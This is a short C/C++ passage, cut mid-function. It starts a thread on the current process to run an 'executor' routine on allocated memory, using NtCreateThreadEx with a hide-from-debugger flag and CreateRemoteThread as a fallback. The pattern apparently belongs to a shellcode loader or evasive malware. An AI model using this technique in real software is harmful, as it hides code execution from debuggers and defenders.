                phThread,
                THREAD_ALL_ACCESS,
                nullptr,
                (HANDLE)-1,
                (void*)executor,
                allocation,
                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                0,
                0,
                0,
                nullptr);

            if (NT_FAIL(status) || !*phThread)
            {
                #ifdef _DEBUG_
                wprintf(L"ERROR: NtCreateThreadEx = 0x%x\n", status);
                #endif
                return NULL;
            }
        #else
            *phThread = CreateRemoteThread(
                (HANDLE)-1,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)executor,
                allocation,
                NULL,
                NULL
            );

